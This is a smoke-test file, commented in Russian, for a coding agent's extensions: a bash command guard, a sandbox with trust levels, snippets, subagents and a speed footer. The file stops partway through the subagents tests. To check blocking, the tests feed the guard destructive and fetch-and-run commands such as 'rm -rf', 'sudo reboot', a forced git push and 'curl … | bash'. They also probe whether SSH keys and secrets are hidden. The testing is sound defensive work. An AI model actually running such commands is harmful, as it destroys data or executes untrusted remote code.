/**
 * Смоук-тест: загружает каждое расширение через jiti (как это делает сам pi)
 * со стаб-объектом ExtensionAPI и проверяет основные пути.
 * Запуск: node test/smoke.test.mjs
 */
import { readFileSync, rmSync, writeFileSync, mkdirSync } from "node:fs";
import { tmpdir, homedir } from "node:os";
import { join } from "node:path";
import { fileURLToPath } from "node:url";
import { createRequire } from "node:module";
import { createJiti } from "jiti";

import { isolateGuardEnv } from "./env.mjs";
isolateGuardEnv();

// Изолируем agent dir (guard-state.json пишется в <agentDir>/ — не в реальный ~/.pi/agent).
const guardAgentDir = join(tmpdir(), `pi-guard-state-test-${process.pid}`);
process.env.PI_CODING_AGENT_DIR = guardAgentDir;

const require = createRequire(import.meta.url);
const jiti = createJiti(fileURLToPath(import.meta.url));

const repoRoot = fileURLToPath(new URL("../", import.meta.url)).replace(/\/+$/, "");
const promptSnippets = jiti("../extensions/prompt-snippets/index.ts");
const bashGuard = jiti("../extensions/bash-guard/index.ts");
const askUserQuestion = jiti("../extensions/ask-user-question/index.ts");

const results = [];
async function check(name, fn, skipReason) {
	if (skipReason) {
		results.push(`skip ${name} (${skipReason})`);
		return;
	}
	try {
		// Изоляция: каждый check стартует с чистым guard-state (файл общий на процесс)
		rmSync(join(guardAgentDir, "guard-state.json"), { force: true });
		await fn();
		results.push(`ok   ${name}`);
	} catch (e) {
		results.push(`FAIL ${name}: ${e?.message ?? e}`);
	}
}

// --- стаб ExtensionAPI ---
function makePi() {
	const handlers = {};
	const shortcuts = [];
	const commands = [];
	const flags = [];
	const tools = [];
	return {
		handlers, shortcuts, commands, flags, tools,
		on: (event, fn) => { handlers[event] = fn; },
		registerShortcut: (key, def) => shortcuts.push({ key, def }),
		registerCommand: (name, def) => commands.push({ name, def }),
		registerFlag: (name, def) => flags.push({ name, def }),
		registerTool: (def) => tools.push(def),
		getFlag: () => false,
	};
}

const noUiCtx = {
	hasUI: false,
	mode: "tui",
	ui: {
		notify: () => {},
		setWidget: () => {},
		setStatus: () => {},
		theme: { fg: (_c, s) => s, bg: (_c, s) => s, bold: (s) => s },
	},
};

// === 1. prompt-snippets ===
{
	const pi = makePi();
	promptSnippets.default(pi);
	await check("prompt-snippets: зарегистрированы alt+s и /snippets", () => {
		if (!pi.shortcuts.some((s) => s.key === "alt+s")) throw new Error("нет alt+s");
		if (!pi.commands.some((c) => c.name === "snippets")) throw new Error("нет /snippets");
	});
	await check("prompt-snippets: input без активных сниппетов не трансформирует", async () => {
		const handler = pi.handlers.input;
		if (!handler) throw new Error("нет обработчика input");
		const res = await handler({ text: "привет" }, noUiCtx);
		if (res !== undefined) throw new Error("ожидалось undefined, получили: " + JSON.stringify(res));
	});
	await check("prompt-snippets: session_start не роняет", async () => {
		await pi.handlers.session_start({ reason: "startup" }, noUiCtx);
	});
	await check("prompt-snippets: slash-команды и `!`-режим не трансформируются (и не тратят переключатели)", () => {
		if (promptSnippets.transformable("/skill:gitlab-tasks") !== false) throw new Error("/skill должен пропускаться");
		if (promptSnippets.transformable("/compact") !== false) throw new Error("/compact должен пропускаться");
		if (promptSnippets.transformable("  !ls") !== false) throw new Error("!-режим должен пропускаться");
		if (promptSnippets.transformable("сделай задачу") !== true) throw new Error("обычный текст должен трансформироваться");
	});
	await check("prompt-snippets: сниппеты на русском", () => {
		const dir = fileURLToPath(new URL("../extensions/prompt-snippets/snippets/", import.meta.url));
		const raw = readFileSync(dir + "verify-not-assume.md", "utf8");
		if (!raw.includes("Проверяй, не угадывай")) throw new Error("нет русского текста");
	});
}

// === 2. bash-guard ===
{
	const pi = makePi();
	bashGuard.default(pi);
	await check("bash-guard: зарегистрированы флаги и команда", () => {
		if (!pi.flags.some((f) => f.name === "bash-guard-disabled")) throw new Error("нет флага bash-guard-disabled");
		if (!pi.flags.some((f) => f.name === "bash-guard-auto-allow")) throw new Error("нет флага bash-guard-auto-allow");
		if (!pi.commands.some((c) => c.name === "bash-guard")) throw new Error("нет /bash-guard");
		if (!pi.commands.some((c) => c.name === "bash-guard:rm")) throw new Error("нет /bash-guard:rm");
	});
	const toolHandler = pi.handlers.tool_call;
	if (!toolHandler) {
		results.push("FAIL bash-guard: нет обработчика tool_call");
	}
	await check("bash-guard: rm -rf блокируется без UI", async () => {
		const res = await toolHandler({ toolName: "bash", input: { command: "rm -rf /tmp/xyz" } }, noUiCtx);
		if (!res?.block) throw new Error("ожидалось block, получили: " + JSON.stringify(res));
		if (!res.reason.includes("bash-guard")) throw new Error("причина: " + res.reason);
	});
	await check("bash-guard: /bash-guard:rm снимает запрет rm (интерактив и floor)", async () => {
		const piRm = makePi();
		bashGuard.default(piRm);
		const h = piRm.handlers.tool_call;
		await piRm.commands.find((c) => c.name === "bash-guard:rm").def.handler("", noUiCtx);
		const res1 = await h({ toolName: "bash", input: { command: "rm -rf build/" } }, noUiCtx);
		if (res1 !== undefined) throw new Error("rm после /bash-guard:rm всё равно блокируется: " + JSON.stringify(res1));
		await piRm.commands.find((c) => c.name === "bash-guard").def.handler("", noUiCtx); // автономный режим
		const res2 = await h({ toolName: "bash", input: { command: "rm -rf node_modules" } }, noUiCtx);
		if (res2 !== undefined) throw new Error("rm в floor-режиме с rmAllowed не прошёл: " + JSON.stringify(res2));
		const res3 = await h({ toolName: "bash", input: { command: "sudo reboot" } }, noUiCtx);
		if (!res3?.block) throw new Error("sudo в floor-режиме не блокируется");
	});
	await check("bash-guard: ls -la не блокируется", async () => {
		const res = await toolHandler({ toolName: "bash", input: { command: "ls -la" } }, noUiCtx);
		if (res !== undefined) throw new Error("ожидалось undefined, получили: " + JSON.stringify(res));
	});
	await check("bash-guard: git status не блокируется (read-only allowlist)", async () => {
		const res = await toolHandler({ toolName: "bash", input: { command: "git status" } }, noUiCtx);
		if (res !== undefined) throw new Error("ожидалось undefined, получили: " + JSON.stringify(res));
	});
	await check("bash-guard: git commit блокируется", async () => {
		const res = await toolHandler({ toolName: "bash", input: { command: "git commit -m x" } }, noUiCtx);
		if (!res?.block) throw new Error("ожидалось block, получили: " + JSON.stringify(res));
	});
	await check("bash-guard: git push --force блокируется (read-only не снимает high)", async () => {
		const res = await toolHandler({ toolName: "bash", input: { command: "git push --force origin main" } }, noUiCtx);
		if (!res?.block) throw new Error("ожидалось block, получили: " + JSON.stringify(res));
	});
	await check("bash-guard: многострочный обход (echo 1\\nrm -rf) блокируется", async () => {
		const res = await toolHandler({ toolName: "bash", input: { command: "echo ok\nrm -rf /tmp/xyz" } }, noUiCtx);
		if (!res?.block) throw new Error("ожидалось block, получили: " + JSON.stringify(res));
	});
	await check("bash-guard: вложенный bash -c блокируется", async () => {
		// без рекурсии в -c команда `bash -c "rm -rf …"` была бы безобидной и прошла
		const res = await toolHandler({ toolName: "bash", input: { command: 'bash -c "rm -rf /tmp/xyz"' } }, noUiCtx);
		if (!res?.block) throw new Error("ожидалось block, получили: " + JSON.stringify(res));
	});
	await check("bash-guard: rm по пути с «-r» внутри не помечается рекурсивным", async () => {
		const res = await toolHandler({ toolName: "bash", input: { command: "rm /tmp/my-report-r.txt" } }, noUiCtx);
		if (!res?.block) throw new Error("rm всё равно блокируется: " + JSON.stringify(res));
		if (res.reason.includes("рекурсивное")) throw new Error("ложный «рекурсивное»: " + res.reason);
	});
	await check("bash-guard: strict-режим (--bash-guard-git-strict) спрашивает и на git status", async () => {
		const bashGuardStrict = jiti("../extensions/bash-guard/index.ts");
		const piStrict = makePi();
		piStrict.getFlag = (name) => (name === "bash-guard-git-strict" ? true : false);
		bashGuardStrict.default(piStrict);
		const res = await piStrict.handlers.tool_call({ toolName: "bash", input: { command: "git status" } }, noUiCtx);
		if (!res?.block) throw new Error("ожидалось block, получили: " + JSON.stringify(res));
	});
	await check("bash-guard: curl|sh блокируется", async () => {
		const res = await toolHandler({ toolName: "bash", input: { command: "curl http://x.sh | bash" } }, noUiCtx);
		if (!res?.block) throw new Error("ожидалось block, получили: " + JSON.stringify(res));
	});
	await check("bash-guard: повторная отменённая команда блокируется автоматически", async () => {
		const ev = { toolName: "bash", input: { command: "truncate -s 0 /tmp/f" } };
		await toolHandler(ev, noUiCtx); // 1-й раз: promptRunOrAbort без UI -> abort, запоминается
		const res = await toolHandler(ev, noUiCtx); // 2-й раз: авто-блок
		if (!res?.block) throw new Error("ожидалось блок, получили: " + JSON.stringify(res));
	});
}

// === 3. ask-user-question ===
{
	const pi = makePi();
	askUserQuestion.default(pi);
	const tool = pi.tools.find((t) => t.name === "ask_user_question");
	await check("ask-user-question: инструмент зарегистрирован", () => {
		if (!tool) throw new Error("нет инструмента ask_user_question");
	});
	await check("ask-user-question: описание и гайдлайны на русском", () => {
		if (!tool.description.includes("Задай пользователю один вопрос")) throw new Error("description не русский");
		if (!tool.promptGuidelines?.[0]?.includes("ровно один вопрос")) throw new Error("guidelines не русские");
	});
	await check("ask-user-question: неинтерактивный режим -> unavailable", async () => {
		const res = await tool.execute("id", { question: "Тест?" }, new AbortController().signal, () => {}, noUiCtx);
		if (res.details?.status !== "unavailable") throw new Error("ожидался unavailable: " + JSON.stringify(res.details));
	});
	await check("ask-user-question: aborted сигнал -> cancelled", async () => {
		const ac = new AbortController();
		ac.abort();
		const res = await tool.execute("id", { question: "Тест?" }, ac.signal, () => {}, noUiCtx);
		if (res.details?.status !== "cancelled") throw new Error("ожидался cancelled: " + JSON.stringify(res.details));
	});
	await check("ask-user-question: renderCall/renderResult не роняют", () => {
		const theme = { fg: (_c, s) => s, bold: (s) => s };
		const c = tool.renderCall({ question: "Вопрос?", options: [{ label: "Да" }] }, theme);
		if (!c) throw new Error("renderCall вернул пусто");
		const r = tool.renderResult({ content: [{ type: "text", text: "Пользователь выбрал: 1. Да" }] }, {}, theme);
		if (!r) throw new Error("renderResult вернул пусто");
	});
}


// === 4. sandbox ===
{
	const sbxExt = jiti("../extensions/sandbox/index.ts");
	const pi = makePi();
	sbxExt.default(pi);

	const { mkdirSync, writeFileSync, existsSync } = await import("node:fs");
	const { execFileSync, execFile, spawnSync } = await import("node:child_process");

	// Проверка «песочница реально работает», а не «bwrap в PATH»: тот же probe,
	// что делает extensions/sandbox/index.ts (checkBackend): bind'ы только
	// существующих каталогов (хосты без /lib64 — GH-раннеры — не должны
	// расходиться с расширением). Без рабочих namespaces (CI, чужая машина)
	// проверки ниже пропускаются, а не падают.
	const sysDirs = ["/usr", "/bin", "/lib", "/lib64"].filter((d) => existsSync(d));
	const hasBwrap =
		process.platform === "linux" &&
		spawnSync("bwrap", [
			...sysDirs.flatMap((d) => ["--ro-bind", d, d]),
			"--tmpfs", "/tmp", "--dev", "/dev", "--proc", "/proc", "--unshare-pid", "--", "true",
		]).status === 0;
	// Бэкенд — по платформе: на macOS расширение считает рабочим sandbox-exec
	// (есть во всех современных macOS), и wrap там обязан исполняться, а не
	// ожидаться fail-closed блоком. Раньше darwin попадал в «нет бэкенда», и
	// macOS-путь wrap никогда не проверялся (там и прятался баг env/--).
	const backendOk = process.platform === "linux" ? hasBwrap : process.platform === "darwin";
	const needsBackend = backendOk ? null : "нужен бэкенд (bwrap на Linux, sandbox-exec на macOS)";
	// Пробник нужен и sandbox-trust-секции (ниже, вне этого блока).
	globalThis.__piBackendOk = backendOk;

	// Фикстура-проект в $HOME (НЕ в /tmp: bwrap маскирует /tmp свежим tmpfs).
	// Путь берём из homedir: зашитый путь автора ломал смоук на других машинах.
	const fixture = join(homedir(), "pi-sbx-fixture");
	if (!existsSync(fixture + "/.git")) {
		mkdirSync(fixture, { recursive: true });
		execFileSync("git", ["init", "-q"], { cwd: fixture });
	}
	writeFileSync(fixture + "/.sandbox", "dev\n");
	const ctxSbx = { ...noUiCtx, cwd: fixture };

	await check("sandbox: .sandbox=dev оборачивает bash-команду (bwrap/sandbox-exec)", async () => {
		const ev = { toolName: "bash", input: { command: "echo hello-sbx" } };
		await pi.handlers.tool_call(ev, ctxSbx);
		const cmd = String(ev.input.command);
		if (!/bwrap|sandbox-exec/.test(cmd)) throw new Error("не обёрнуто: " + cmd.slice(0, 120));
		// Обёртку должен узнавать bash-guard (по голове команды, без маркеров и
		// зависимости от порядка загрузки расширений).
		if (!bashGuard.sandboxWrapped(cmd)) throw new Error("bash-guard не узнал обёртку: " + cmd.slice(0, 120));
		if (bashGuard.sandboxWrapped("rm -rf build")) throw new Error("обычная команда принята за обёртку");
	}, needsBackend);

	async function runWrapped(command, cwd) {
		const ev = { toolName: "bash", input: { command } };
		await pi.handlers.tool_call(ev, { ...noUiCtx, cwd });
		return await new Promise((res) =>
			execFile("bash", ["-c", ev.input.command], { timeout: 60000, maxBuffer: 1024 * 1024 }, (e, so, se) =>
				res(((so || "") + (se ? "\n" + se : "")).trim()),
			),
		);
	}

	await check("sandbox: home/секреты скрыты, workspace rw (e2e)", async () => {
		const home = homedir();
		const out = await runWrapped(
			`ls -A ${home} 2>/dev/null | tr "\n" " " | grep -qE "\.(ssh|gnupg)" && echo SECRETS-VISIBLE || echo SECRETS-HIDDEN; ls ${home}/.ssh >/dev/null 2>&1 && echo SSH-VISIBLE || echo SSH-HIDDEN; ls ${home}/Code >/dev/null 2>&1 && echo CODE-VISIBLE || echo CODE-HIDDEN; touch "${fixture}/.wtest" && echo WS-RW || echo WS-FAIL; rm -f "${fixture}/.wtest"`,
			fixture,
		);
		if (!out.includes("SECRETS-HIDDEN")) throw new Error("секретные home-каталоги видны: " + out);
		if (!out.includes("SSH-HIDDEN")) throw new Error("ssh виден: " + out);
		if (!out.includes("CODE-HIDDEN")) throw new Error("другие проекты видны: " + out);
		if (!out.includes("WS-RW")) throw new Error("workspace не rw: " + out);
	}, needsBackend);

	await check("sandbox: секреты env не попадают в песочницу", async () => {
		process.env.FAKE_API_KEY_SANDBOX_TEST = "secret123";
		const out = await runWrapped("env | grep -c FAKE_API_KEY_SANDBOX_TEST || true", fixture);
		if (!out.trim().startsWith("0")) throw new Error("секрет виден: " + out);
		delete process.env.FAKE_API_KEY_SANDBOX_TEST;
	}, needsBackend);

	await check("sandbox: untrusted блокирует сеть (e2e)", async () => {
		writeFileSync(fixture + "/.sandbox", "untrusted\n");
		// --max-time вместо timeout(1): на macOS coreutils timeout обычно отсутствует,
		// и отсутствие утилиты дало бы NET-BLOCKED без реальной сетевой проверки
		const out = await runWrapped("curl -sI --max-time 6 https://1.1.1.1 >/dev/null 2>&1 && echo NET-OK || echo NET-BLOCKED", fixture);
		if (!out.includes("NET-BLOCKED")) throw new Error("сеть жива: " + out);
		writeFileSync(fixture + "/.sandbox", "dev\n");
	}, needsBackend);

	await check("sandbox: vm-уровень блокирует bash с инструкцией", async () => {
		const piVm = makePi();
		piVm.getFlag = (name) => (name === "sandbox-level" ? "vm" : false);
		sbxExt.default(piVm);
		const res = await piVm.handlers.tool_call({ toolName: "bash", input: { command: "echo x" } }, ctxSbx);
		if (!res?.block || !res.reason.includes("vm")) throw new Error("нет блока: " + JSON.stringify(res));
	});

	await check("sandbox: без маркера — passthrough", async () => {
		const plain = join(homedir(), "pi-sbx-fixture-plain");
		if (!existsSync(plain + "/.git")) {
			mkdirSync(plain, { recursive: true });
			execFileSync("git", ["init", "-q"], { cwd: plain });
		}
		const ev = { toolName: "bash", input: { command: "echo plain" } };
		await pi.handlers.tool_call(ev, { ...noUiCtx, cwd: plain });
		if (ev.input.command !== "echo plain") throw new Error("команду тронули: " + ev.input.command);
	});
}


// === 5. sandbox: trust prompt (project_trust + session_start fallback) ===
{
	const { unlinkSync, readFileSync: rfs } = await import("node:fs");
	const trustFile = "/tmp/pi-sbx-trust-test.json";
	const cleanStore = () => { try { unlinkSync(trustFile); } catch {} };
	process.env.PI_SANDBOX_TRUST_FILE = trustFile;

	const plain = join(homedir(), "pi-sbx-fixture-plain"); // без .sandbox
	const mkCtx = (cwd) => ({
		hasUI: true,
		cwd,
		mode: "default",
		signal: new AbortController().signal,
		ui: {
			theme: { fg: (_c, t) => t, bold: (t) => t, bg: (_c, t) => t },
			setStatus: () => {},
			notify: () => {},
			select: async () => undefined,
		},
	});

	await check("sandbox-trust: project_trust без маркера спрашивает уровень и запоминает", async () => {
		cleanStore();
		const sbxExt2 = jiti("../extensions/sandbox/index.ts");
		const pi2 = makePi();
		sbxExt2.default(pi2);
		let calls = 0;
		const ctxT = mkCtx(plain);
		ctxT.ui.select = async (_t, opts) => { calls++; return opts[2]; };
		const res = await pi2.handlers.project_trust({ type: "project_trust", cwd: plain }, ctxT);
		if (calls !== 1) throw new Error("select не вызван: " + calls);
		if (res.trusted !== "no" || res.remember !== true) throw new Error("неверный результат: " + JSON.stringify(res));
		const store = JSON.parse(rfs(trustFile, "utf8"));
		if (store[plain]?.level !== "untrusted") throw new Error("не сохранено: " + JSON.stringify(store));
	});

	await check("sandbox-trust: сохранённое решение — без вопроса, уровень применяется", async () => {
		const sbxExt3 = jiti("../extensions/sandbox/index.ts");
		const pi3 = makePi();
		sbxExt3.default(pi3);
		let calls = 0;
		const ctxT = mkCtx(plain);
		ctxT.ui.select = async () => { calls++; return "x"; };
		const res = await pi3.handlers.project_trust({ type: "project_trust", cwd: plain }, ctxT);
		if (calls !== 0) throw new Error("спросил повторно");
		if (res.trusted !== "no") throw new Error("неверный trust: " + JSON.stringify(res));
		const ev = { toolName: "bash", input: { command: "echo x" } };
		const resCall = await pi3.handlers.tool_call(ev, { ...noUiCtx, cwd: plain });
		const wrapped = String(ev.input.command);
		if (globalThis.__piBackendOk) {
			// untrusted должен дать сетевой blockade: bwrap --unshare-net (Linux) или
			// sandbox-exec-профиль с deny network (macOS)
			const backend = process.platform === "linux" ? "unshare-net" : "sandbox-exec";
			if (!wrapped.includes(backend)) throw new Error("не применён untrusted: " + wrapped.slice(0, 150));
		} else if (!resCall?.block || !/бэкенд|backend/i.test(String(resCall.reason))) {
			// без рабочего бэкенда «уровень применяется» = fail-closed блок, не тихий пропуск
			throw new Error("ни wrap, ни fail-closed блока: " + wrapped.slice(0, 150));
		}
	});

	await check("sandbox-trust: маркер .sandbox — промпт не показывается", async () => {
		const sbxExt4 = jiti("../extensions/sandbox/index.ts");
		const pi4 = makePi();
		sbxExt4.default(pi4);
		let calls = 0;
		const fixture = join(homedir(), "pi-sbx-fixture"); // .sandbox = dev
		const ctxT = mkCtx(fixture);
		ctxT.ui.select = async () => { calls++; return "x"; };
		const res = await pi4.handlers.project_trust({ type: "project_trust", cwd: fixture }, ctxT);
		if (calls !== 0) throw new Error("спросил при маркере");
		if (res.trusted !== "yes") throw new Error("dev должен быть yes: " + JSON.stringify(res));
	});

	await check("sandbox-trust: session_start-фолбэк спрашивает при первом старте, не спрашивает при resume", async () => {
		cleanStore();
		const sbxExt5 = jiti("../extensions/sandbox/index.ts");
		const pi5 = makePi();
		sbxExt5.default(pi5);
		let calls = 0;
		const ctxS = mkCtx(plain);
		ctxS.ui.select = async (_t, opts) => { calls++; return opts[1]; };
		await pi5.handlers.session_start({ type: "session_start", reason: "startup" }, ctxS);
		if (calls !== 1) throw new Error("select не вызван: " + calls);
		const store = JSON.parse(rfs(trustFile, "utf8"));
		if (store[plain]?.level !== "dev") throw new Error("не сохранено: " + JSON.stringify(store));
		const ctxS2 = mkCtx(plain);
		ctxS2.ui.select = async () => { calls++; return "x"; };
		await pi5.handlers.session_start({ type: "session_start", reason: "resume" }, ctxS2);
		if (calls !== 1) throw new Error("спросил при resume: " + calls);
	});

	delete process.env.PI_SANDBOX_TRUST_FILE;
	// фикстуры — только для этого смоука, в $HOME их не оставляем
	rmSync(join(homedir(), "pi-sbx-fixture"), { recursive: true, force: true });
	rmSync(join(homedir(), "pi-sbx-fixture-plain"), { recursive: true, force: true });
}


// === 6. session-insights (skills) ===
{
	const { spawnSync } = await import("node:child_process");
	const { mkdtempSync, rmSync } = await import("node:fs");
	const script = fileURLToPath(new URL("../skills/session-insights/scripts/insights.py", import.meta.url));

	// Синтетическая фикстура под временным $HOME: тесты не должны зависеть от
	// реальных сессий разработчика (на CI-раннере ~/.pi/agent/sessions пуст).
	const fakeHome = mkdtempSync(join(tmpdir(), "pi-insights-home-"));
	try {
		const sessDir = join(fakeHome, ".pi", "agent", "sessions", "home-fake--project--");
		mkdirSync(sessDir, { recursive: true });
		const nowIso = new Date().toISOString();
		const records = [JSON.stringify({ type: "session", id: "fixture-session", cwd: "/home/fake/project", timestamp: nowIso })];
		for (let i = 0; i < 6; i++) {
			records.push(JSON.stringify({ type: "message", message: { role: "user", content: [{ type: "text", text: `вопрос ${i}` }], timestamp: Date.now() } }));
			records.push(JSON.stringify({
				type: "message",
				message: { role: "assistant", model: "test-model", content: [{ type: "text", text: `ответ ${i}` }], usage: { input: 10, output: 5, cost: { total: 0.01 } }, timestamp: Date.now() },
			}));
		}
		writeFileSync(join(sessDir, `${nowIso.slice(0, 19).replace(/:/g, "-")}_fixture-0001.jsonl`), records.join("\n") + "\n");
		// sessions.py берёт корень из PI_CODING_AGENT_DIR (в этом процессе он указан на
		// guard-фикстуру, строка 15), поэтому перекатываем явно оба варианта
		const env = { ...process.env, HOME: fakeHome, USERPROFILE: fakeHome,
			PI_CODING_AGENT_DIR: join(fakeHome, ".pi", "agent"),
			SESSION_INSIGHTS_ROOT: sessDir,
			SESSION_INSIGHTS_LEDGER: join(fakeHome, "ledger.md") };

		await check("session-insights: insights.py --json валиден (на фикстуре)", async () => {
			const r = spawnSync("python3", [script, "--since", "90d", "--json"], { encoding: "utf8", timeout: 120000, env });
			if (r.status !== 0) throw new Error("exit " + r.status + ": " + (r.stderr || "").slice(0, 200));
			const d = JSON.parse(r.stdout);
			for (const k of ["totals", "sessions_top", "tool_errors", "max_tool_output_chars", "signals", "corrections", "by_project", "prompt_keywords"]) {
				if (!(k in d)) throw new Error("нет ключа " + k);
			}
			if (!Number.isInteger(d.totals.sessions) || d.totals.sessions <= 0) throw new Error("sessions = " + d.totals.sessions);
		});

		await check("session-insights: sessions.summarize_session парсит сессию (на фикстуре)", async () => {
			const lib = fileURLToPath(new URL("../skills/session-insights/scripts/sessions.py", import.meta.url));
			const r = spawnSync("python3", [
				"-c",
				`import sys, os; sys.path.insert(0, os.path.dirname(sys.argv[1])); import sessions as S
from pathlib import Path
found = 0
for p in S.iter_session_files(include_subagents=False):
    s = S.summarize_session(p)
    if s and s.message_count >= 10:
        assert s.id and s.cwd, p
        assert s.tool_result_count >= 0 and s.error_count >= 0
        found += 1
assert found > 0, "нет сессий с сообщениями"
print(found)`,
				lib,

			], { encoding: "utf8", timeout: 120000, env });
			if (r.status !== 0) throw new Error((r.stderr || "").slice(0, 300));
		});
	} finally {
		rmSync(fakeHome, { recursive: true, force: true });
	}
}

// === 7. gen-speed ===
{
	const genSpeed = jiti("../extensions/gen-speed/index.ts");
	const piG = makePi();
	genSpeed.default(piG);

	// ctx в стиле TUI: футер устанавливается через setFooter
	let footerFactory = null;
	let lastTheme = null;
	const themeStub = { fg: (c, s) => `[${c}]${s}`, bold: (s) => `*${s}*` };
	const ctxG = {
		hasUI: true,
		mode: "tui",
		cwd: repoRoot,
		model: { id: "test-model", contextWindow: 200000, reasoning: true },
		thinkingLevel: "medium",
		getContextUsage: () => ({ tokens: 48000, contextWindow: 200000, percent: 24 }),
		sessionManager: {
			getEntries: () => [
				{
					type: "message",
					message: {
						role: "assistant",
						usage: { input: 30000, output: 18000, cacheRead: 0, cacheWrite: 0, totalTokens: 48000, cost: { total: 0.5 } },
						stopReason: "stop",
					},
				},
			],
			getSessionName: () => "test-session",
			getCwd: () => repoRoot,
		},
		ui: { setFooter: (f) => { footerFactory = f; } },
	};
	const tuiStub = { requestRender: () => {} };
	const footerDataStub = {
		getGitBranch: () => "master",
		getExtensionStatuses: () => new Map([["bash-guard", "bash-guard: ok"]]),
		getAvailableProviderCount: () => 1,
		onBranchChange: () => () => {},
	};
	const renderFooter = () => {
		if (!footerFactory) throw new Error("setFooter не вызван");
		lastTheme = themeStub;
		return footerFactory(tuiStub, themeStub, footerDataStub).render(200);
	};

	await check("gen-speed: футер устанавливается и бейдж в строке токенов", async () => {
		const realNow = Date.now.bind(Date);
		let fake = 1_000_000;
		Date.now = () => fake;
		try {
			await piG.handlers.message_start({ message: { role: "assistant", usage: { output: 0 } } }, ctxG);
			fake += 300; // TTFT = 300ms
			await piG.handlers.message_update({ message: { role: "assistant", usage: { output: 100 } } }, ctxG);
			fake += 2700; // 3.0s суммарно
			await piG.handlers.message_end({ message: { role: "assistant", usage: { output: 100 }, stopReason: "stop" } }, ctxG);
		} finally {
			Date.now = realNow;
		}
		const lines = renderFooter();
		if (lines.length < 2) throw new Error("мало строк: " + JSON.stringify(lines));
		const stats = lines[1];
		if (!stats.includes("33t/s")) throw new Error("нет 33t/s: " + stats);
		if (!stats.includes("300ms")) throw new Error("нет TTFT: " + stats);
		if (stats.includes("⌀") || stats.includes(" · ")) throw new Error("лишние символы в бейдже: " + stats);
		if (!stats.includes("↑")) throw new Error("нет токенов ↑: " + stats);
		if (!stats.includes("24.0%/200k (auto)")) throw new Error("нет context%: " + stats);
		if (!stats.includes("test-model • medium")) throw new Error("нет модели справа: " + stats);
		// cwd показывается сокращённо до ~ — считаем ожидаемое от реального пути репо
		const home = homedir();
		const pwd = repoRoot.startsWith(home) ? "~" + repoRoot.slice(home.length) : repoRoot;
		if (lines[0] !== `[dim]${pwd} (master) • test-session`) throw new Error("pwd-строка: " + lines[0]);
		// бейдж в строке токенов, а НЕ в строке статусов
		if (lines[2] && lines[2].includes("t/s")) throw new Error("бейдж дублируется в статус-строке: " + lines[2]);
		if (!lines[2] || !lines[2].includes("bash-guard: ok")) throw new Error("статусы других расширений потеряны: " + JSON.stringify(lines));
	});

	await check("gen-speed: очень короткий ответ (<300ms) не двигает бейдж", async () => {
		const realNow = Date.now.bind(Date);
		let fake = 2_000_000;
		Date.now = () => fake;
		try {
			await piG.handlers.message_start({ message: { role: "assistant", usage: { output: 0 } } }, ctxG);
			fake += 200;
			await piG.handlers.message_end({ message: { role: "assistant", usage: { output: 5 }, stopReason: "stop" } }, ctxG);
		} finally {
			Date.now = realNow;
		}
		const stats = renderFooter()[1];
		if (!stats.includes("33t/s")) throw new Error("бейдж изменился: " + stats);
	});

	await check("gen-speed: aborted-ответ не двигает бейдж", async () => {
		const realNow = Date.now.bind(Date);
		let fake = 3_000_000;
		Date.now = () => fake;
		try {
			await piG.handlers.message_start({ message: { role: "assistant", usage: { output: 0 } } }, ctxG);
			fake += 3000;
			await piG.handlers.message_end({ message: { role: "assistant", usage: { output: 500 }, stopReason: "aborted" } }, ctxG);
		} finally {
			Date.now = realNow;
		}
		const stats = renderFooter()[1];
		if (!stats.includes("33t/s")) throw new Error("бейдж изменился: " + stats);
	});

	await check("gen-speed: ответ 700ms (быстрая модель) учитывается", async () => {
		const realNow = Date.now.bind(Date);
		let fake = 4_000_000;
		Date.now = () => fake;
		try {
			await piG.handlers.message_start({ message: { role: "assistant", usage: { output: 0 } } }, ctxG);
			fake += 100; // TTFT
			await piG.handlers.message_update({ message: { role: "assistant", usage: { output: 90 } } }, ctxG);
			fake += 600;
			await piG.handlers.message_end({ message: { role: "assistant", usage: { output: 90 }, stopReason: "stop" } }, ctxG);
		} finally {
			Date.now = realNow;
		}
		const stats = renderFooter()[1];
		// EMA от 33.3 и 128.6 (90 tok / 0.7s) с alpha 0.4 ≈ 71.4 → 71t/s
		if (!stats.includes("71t/s")) throw new Error("быстрый ответ не учтён: " + stats);
	});

	await check("gen-speed: session_start сбрасывает статистику и переустанавливает футер", async () => {
		footerFactory = null;
		await piG.handlers.session_start({ reason: "startup" }, ctxG);
		if (!footerFactory) throw new Error("футер не переустановлен");
		const lines = renderFooter();
		if (lines[1].includes("t/s")) throw new Error("бейдж не сброшен: " + lines[1]);
	});

	await check("gen-speed: в режиме print футер не устанавливается", async () => {
		const piP = makePi();
		genSpeed.default(piP);
		let called = false;
		const ctxP = { ...ctxG, mode: "print", hasUI: false, ui: { setFooter: () => { called = true; } } };
		await piP.handlers.message_start({ message: { role: "assistant", usage: { output: 0 } } }, ctxP);
		if (called) throw new Error("setFooter вызван в print-режиме");
	});
}

// === 8. subagents ===
{
	// child.ts читает env при загрузке модуля → свежий jiti без кэша на каждый режим
	const { createJiti: createJitiForChild } = await import("jiti");
	const jitiChild = (p) => createJitiForChild(import.meta.url, { cache: false })(p);

	const subagentsExt = jiti("../extensions/subagents/index.ts");
	const pi = makePi();
	pi.registerMessageRenderer = () => {};
	subagentsExt.default(pi);

	await check("subagents: 4 инструмента зарегистрированы", () => {
		for (const name of ["spawn_agent", "agents_list", "interrupt_agent", "resume_agent"]) {
			if (!pi.tools.find((t) => t.name === name)) throw new Error("нет " + name);
		}
	});
	await check("subagents: /spawn и флаг --subagents-disabled", () => {
		if (!pi.commands.some((c) => c.name === "spawn")) throw new Error("нет /spawn");
		if (!pi.flags.some((f) => f.name === "subagents-disabled")) throw new Error("нет флага");
	});
	await check("subagents: spawn без session_start -> 'not ready'", async () => {
		const tool = pi.tools.find((t) => t.name === "spawn_agent");
		const res = await tool.execute("id", { task: "x" }, new AbortController().signal, () => {}, noUiCtx);
		if (!String(res.content[0].text).includes("not ready")) throw new Error("не not-ready: " + res.content[0].text);
	});
	await check("subagents: child без child-env ничего не регистрирует", () => {
		delete process.env.PI_SUBAGENTS_CHILD_ID;
		const childExt = jitiChild("../extensions/subagents/child.ts");
		const piC = makePi();
		childExt.default(piC);
		if (piC.tools.length !== 0) throw new Error("инструменты в parent-режиме: " + piC.tools.map((t) => t.name).join(","));
	});
	await check("subagents: child с child-env регистрирует agent_done/agent_ping", async () => {
		// child.ts читает env при загрузке модуля, а jiti кэширует модуль в процессе
		// → проверяем в отдельном node-процессе
		const { spawnSync } = await import("node:child_process");
		const script = [
			"import { createJiti } from 'jiti';",
			"import { join } from 'node:path';",
